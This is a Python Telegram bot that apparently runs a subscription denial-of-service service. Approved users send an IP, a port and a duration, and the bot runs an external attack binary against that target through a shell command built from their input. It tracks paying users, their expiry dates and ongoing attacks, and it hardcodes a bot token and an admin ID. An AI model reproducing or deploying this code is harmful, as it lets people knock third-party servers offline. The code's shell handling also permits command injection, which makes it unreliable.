import telebot
import sqlite3
from datetime import datetime, timedelta
import subprocess
import logging
import time
import threading
from telebot import types
import requests
from requests.exceptions import RequestException

# Replace with your actual bot token and admin IDs
API_TOKEN = "7366256726:AAHs59W1aVoSWmwlCWtTuLENNQ94Wpb56T0"
ADMIN_IDS = {5161151187}  # Example: set of admin IDs

bot = telebot.TeleBot(API_TOKEN)

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Initialize the database
def initialize_db():
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
                    id INTEGER PRIMARY KEY,
                    status TEXT,
                    expire_date TEXT,
                    username TEXT)''')

    c.execute('''CREATE TABLE IF NOT EXISTS attacks (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    ip TEXT,
                    port INTEGER,
                    time INTEGER,
                    user_id INTEGER,
                    start_time TEXT,
                    end_time TEXT,
                    active INTEGER,
                    FOREIGN KEY(user_id) REFERENCES users(id))''')

    c.execute('''CREATE TABLE IF NOT EXISTS logs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    message TEXT,
                    timestamp TEXT)''')

    c.execute('''CREATE TABLE IF NOT EXISTS user_commands (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    command TEXT,
                    timestamp TEXT,
                    FOREIGN KEY(user_id) REFERENCES users(id))''')

    conn.commit()
    conn.close()

# Add username column if it doesn't exist
def add_username_column():
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    try:
        c.execute("ALTER TABLE users ADD COLUMN username TEXT")
        conn.commit()
        logger.info("Column 'username' added successfully.")
    except sqlite3.OperationalError as e:
        logger.info(f"Column 'username' already exists: {e}")
    conn.close()

# Initialize and upgrade the database
initialize_db()
add_username_column()

# Helper functions
def add_log(message):
    try:
        conn = sqlite3.connect('bot_data.db')
        c = conn.cursor()
        c.execute("INSERT INTO logs (message, timestamp) VALUES (?, ?)", (message, datetime.now().isoformat()))
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"Error adding log: {e}")

def log_command(user_id, command):
    try:
        conn = sqlite3.connect('bot_data.db')
        c = conn.cursor()
        c.execute("INSERT INTO user_commands (user_id, command, timestamp) VALUES (?, ?, ?)",
                  (user_id, command, datetime.now().isoformat()))
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"Error logging command: {e}")

def is_admin(user_id):
    return user_id in ADMIN_IDS

def stop_attack(attack_id):
    try:
        conn = sqlite3.connect('bot_data.db')
        c = conn.cursor()
        c.execute("UPDATE attacks SET active = 0 WHERE id = ?", (attack_id,))
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"Error stopping attack: {e}")

def send_telegram_message(chat_id, text):
    try:
        response = requests.post(
            f"https://api.telegram.org/bot{API_TOKEN}/sendMessage",
            data={"chat_id": chat_id, "text": text}
        )
        response.raise_for_status()
    except RequestException as e:
        logger.error(f"Error sending message to Telegram: {e}")

def attack_thread(ip, port, attack_time, attack_id):
    try:
        start_time = time.time()
        command = f"./11124 {ip} {port} {attack_time} 50"
        process = subprocess.Popen(command, shell=True)
        time.sleep(attack_time)  # Wait for attack time

        process.terminate()
        stop_attack(attack_id)
        end_time = time.time()
        add_log(f'Attack on IP {ip}, Port {port} has ended')

        message = (f'Attack ended\n'
                   f'IP: {ip}\n'
                   f'Port: {port}\n'
                   f'Time: {end_time - start_time:.2f} seconds\n'
                   f'Watermark: @telegram channel @itsdemonVip @CeenuOp Terms of service use and legal considerations.')

        # Send message to all admins
        for admin_id in ADMIN_IDS:
            send_telegram_message(admin_id, message)
    except Exception as e:
        logger.error(f"Error in attack thread: {e}")

def update_approved_users_file():
    try:
        conn = sqlite3.connect('bot_data.db')
        c = conn.cursor()
        c.execute("SELECT id, username FROM users WHERE status = 'approved'")
        approved_users = c.fetchall()
        conn.close()

        with open('user.txt', 'w') as file:
            for user_id, username in approved_users:
                file.write(f'{user_id} {username}\n')
    except Exception as e:
        logger.error(f"Error updating user.txt: {e}")

# Command handlers
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    log_command(user_id, '/start')
    markup = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
    markup.add(
        types.KeyboardButton('/approve'),
        types.KeyboardButton('/disapprove'),
        types.KeyboardButton('/check_all_user'),
        types.KeyboardButton('/check_on_going_attack'),
        types.KeyboardButton('/check_user_on_going_attack'),
        types.KeyboardButton('/show_all_user_information'),
        types.KeyboardButton('/attack'),
        types.KeyboardButton('/status'),
        types.KeyboardButton('/commands'),
        types.KeyboardButton('/Show_user_commands'),
        types.KeyboardButton('/Show_all_approved_users')
    )
    bot.send_message(message.chat.id, "Welcome! Use the commands below:", reply_markup=markup)

@bot.message_handler(commands=['approve'])
def approve(message):
    log_command(message.from_user.id, '/approve')
    if not is_admin(message.from_user.id):
        bot.reply_to(message, 'You are not authorized to use this command.')
        return

    args = message.text.split()
    if len(args) != 4:
        bot.reply_to(message, 'Usage: /approve <id> <days> <username>')
        return

    try:
        user_id = int(args[1])
        days = int(args[2])
        username = args[3]

        expire_date = datetime.now() + timedelta(days=days)

        conn = sqlite3.connect('bot_data.db')
        c = conn.cursor()
        c.execute("INSERT OR REPLACE INTO users (id, status, expire_date, username) VALUES (?, 'approved', ?, ?)",
                  (user_id, expire_date.isoformat(), username))
        conn.commit()
        conn.close()

        update_approved_users_file()
        add_log(f'User {user_id} approved until {expire_date} with username {username}')
        bot.reply_to(message, f'User {user_id} approved until {expire_date} with username {username}')
    except Exception as e:
        logger.error(f"Error handling /approve command: {e}")

@bot.message_handler(commands=['disapprove'])
def disapprove(message):
    log_command(message.from_user.id, '/disapprove')
    if not is_admin(message.from_user.id):
        bot.reply_to(message, 'You are not authorized to use this command.')
        return

    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, 'Usage: /disapprove <id>')
        return

    try:
        user_id = int(args[1])
        conn = sqlite3.connect('bot_data.db')
        c = conn.cursor()
        c.execute("DELETE FROM users WHERE id = ?", (user_id,))
        conn.commit()
        conn.close()

        update_approved_users_file()
        add_log(f'User {user_id} disapproved')
        bot.reply_to(message, f'User {user_id} disapproved')
    except Exception as e:
        logger.error(f"Error handling /disapprove command: {e}")

@bot.message_handler(commands=['check_all_user'])
def check_all_user(message):
    log_command(message.from_user.id, '/check_all_user')
    try:
        conn = sqlite3.connect('bot_data.db')
        c = conn.cursor()
        c.execute("SELECT id, status, expire_date, username FROM users")
        users = c.fetchall()
        conn.close()

        if not users:
            bot.reply_to(message, 'No users found')
            return

        user_info = '\n'.join([f'ID: {uid}, Status: {status}, Expire Date: {expire_date}, Username: {username}' for uid, status, expire_date, username in users])
        bot.reply_to(message, user_info)
    except Exception as e:
        logger.error(f"Error handling /check_all_user command: {e}")

@bot.message_handler(commands=['check_on_going_attack'])
def check_on_going_attack(message):
    log_command(message.from_user.id, '/check_on_going_attack')
    try:
        conn = sqlite3.connect('bot_data.db')
        c = conn.cursor()
        c.execute("SELECT id, ip, port, time, user_id FROM attacks WHERE active = 1")
        attacks = c.fetchall()
        conn.close()

        if not attacks:
            bot.reply_to(message, 'No ongoing attacks found')
            return

        attack_info = '\n'.join([f'ID: {attack_id}, IP: {ip}, Port: {port}, Time: {time}, User ID: {user_id}' for attack_id, ip, port, time, user_id in attacks])
        bot.reply_to(message, attack_info)
    except Exception as e:
        logger.error(f"Error handling /check_on_going_attack command: {e}")

@bot.message_handler(commands=['check_user_on_going_attack'])
def check_user_on_going_attack(message):
    log_command(message.from_user.id, '/check_user_on_going_attack')
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, 'Usage: /check_user_on_going_attack <user_id>')
        return

    try:
        user_id = int(args[1])
        conn = sqlite3.connect('bot_data.db')
        c = conn.cursor()
        c.execute("SELECT id, ip, port, time FROM attacks WHERE user_id = ? AND active = 1", (user_id,))
        attacks = c.fetchall()
        conn.close()

        if not attacks:
            bot.reply_to(message, 'No ongoing attacks for this user')
            return

        attack_info = '\n'.join([f'ID: {attack_id}, IP: {ip}, Port: {port}, Time: {time}' for attack_id, ip, port, time in attacks])
        bot.reply_to(message, attack_info)
    except Exception as e:
        logger.error(f"Error handling /check_user_on_going_attack command: {e}")

@bot.message_handler(commands=['show_all_user_information'])
def show_all_user_information(message):
    log_command(message.from_user.id, '/show_all_user_information')
    try:
        conn = sqlite3.connect('bot_data.db')
        c = conn.cursor()
        c.execute("SELECT id, status, expire_date, username FROM users")
        users = c.fetchall()
        conn.close()

        if not users:
            bot.reply_to(message, 'No users found')
            return

        user_info = '\n'.join([f'ID: {uid}, Status: {status}, Expire Date: {expire_date}, Username: {username}' for uid, status, expire_date, username in users])
        bot.reply_to(message, user_info)
    except Exception as e:
        logger.error(f"Error handling /show_all_user_information command: {e}")

@bot.message_handler(commands=['attack'])
def attack(message):
    user_id = message.from_user.id
    log_command(user_id, '/attack')

    # Check if user is approved
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    c.execute("SELECT status FROM users WHERE id = ?", (user_id,))
    user_status = c.fetchone()
    conn.close()

    if user_status is None or user_status[0] != 'approved':
        bot.reply_to(message, 'You are not approved to use this command.')
        return

    args = message.text.split()
    if len(args) != 4:
        bot.reply_to(message, 'Usage: /attack <ip> <port> <time>')
        return

    try:
        ip = args[1]
        port = int(args[2])
        attack_time = int(args[3])

        conn = sqlite3.connect('bot_data.db')
        c = conn.cursor()
        c.execute("INSERT INTO attacks (ip, port, time, user_id, start_time, active) VALUES (?, ?, ?, ?, ?, 1)",
                  (ip, port, attack_time, user_id, datetime.now().isoformat()))
        attack_id = c.lastrowid
        conn.commit()
        conn.close()

        threading.Thread(target=attack_thread, args=(ip, port, attack_time, attack_id)).start()
        bot.reply_to(message, f'Attack started on IP {ip}, Port {port} for {attack_time} seconds')
    except Exception as e:
        logger.error(f"Error handling /attack command: {e}")
        bot.reply_to(message, 'An error occurred while processing the attack.')

@bot.message_handler(commands=['status'])
def status(message):
    log_command(message.from_user.id, '/status')
    bot.reply_to(message, 'Bot is running.')

@bot.message_handler(commands=['commands'])
def commands(message):
    log_command(message.from_user.id, '/commands')
    bot.reply_to(message, '/approve\n/disapprove\n/check_all_user\n/check_on_going_attack\n/check_user_on_going_attack\n/show_all_user_information\n/attack\n/status\n/commands\n/Show_user_commands\n/Show_all_approved_users')

@bot.message_handler(commands=['Show_user_commands'])
def show_user_commands(message):
    log_command(message.from_user.id, '/Show_user_commands')
    try:
        conn = sqlite3.connect('bot_data.db')
        c = conn.cursor()
        c.execute("SELECT user_id, command, timestamp FROM user_commands WHERE user_id = ?", (message.from_user.id,))
        commands = c.fetchall()
        conn.close()

        if not commands:
            bot.reply_to(message, 'No commands found for this user')
            return

        command_info = '\n'.join([f'Command: {command}, Timestamp: {timestamp}' for _, command, timestamp in commands])
        bot.reply_to(message, command_info)
    except Exception as e:
        logger.error(f"Error handling /Show_user_commands command: {e}")

@bot.message_handler(commands=['Show_all_approved_users'])
def show_all_approved_users(message):
    log_command(message.from_user.id, '/Show_all_approved_users')
    try:
        conn = sqlite3.connect('bot_data.db')
        c = conn.cursor()
        c.execute("SELECT id, username FROM users WHERE status = 'approved'")
        approved_users = c.fetchall()
        conn.close()

        if not approved_users:
            bot.reply_to(message, 'No approved users found')
            return

        approved_users_info = '\n'.join([f'ID: {user_id}, Username: {username}' for user_id, username in approved_users])
        bot.reply_to(message, approved_users_info)
    except Exception as e:
        logger.error(f"Error handling /Show_all_approved_users command: {e}")

# Restart bot every 15 minutes
def restart_bot():
    while True:
        time.sleep(2 * 60)  # Sleep for 15 minutes
        try:
            bot.stop_polling()
            bot.polling(none_stop=True, interval=0)
        except Exception as e:
            logger.error(f"Error restarting bot: {e}")

# Start bot and restart thread
if __name__ == '__main__':
    threading.Thread(target=restart_bot, daemon=True).start()
    bot.polling(none_stop=True, interval=0)
